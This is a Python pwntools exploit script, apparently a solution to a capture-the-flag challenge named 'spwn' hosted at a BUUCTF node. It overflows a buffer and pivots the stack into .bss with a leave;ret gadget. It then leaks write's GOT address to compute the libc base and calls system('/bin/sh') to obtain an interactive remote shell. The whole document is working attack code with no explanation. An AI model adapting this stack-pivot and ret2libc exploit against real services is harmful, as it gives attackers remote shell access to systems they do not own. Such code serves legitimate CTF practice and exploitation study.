from pwn import *

#context.log_level = 'debug'

#p = process('./spwn')
p = remote('node3.buuoj.cn', 25320)
elf = ELF('spwn')

#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')

#gdb.attach(p, 'b *0x08048408')

write_plt = elf.plt['write']
write_got = elf.got['write']
vuln_addr = elf.sym['main']

fake_bss = 0x0804A300

leave_ret = 0x08048408

fake_stack = p32(0) + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(write_got) + p32(4)

payload = b'a' * ( 0x18 ) + p32(fake_bss) + p32(leave_ret)

p.sendlineafter('name?', fake_stack)
p.sendafter('say?', payload)

write_real_addr = u32(p.recv(4))

libc_base = write_real_addr - libc.sym['write']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

fake_stack = p32(0) + p32(system_addr) + p32(vuln_addr) + p32(bin_sh)

p.sendlineafter('name?', fake_stack)
p.sendafter('say?', payload)

p.interactive()
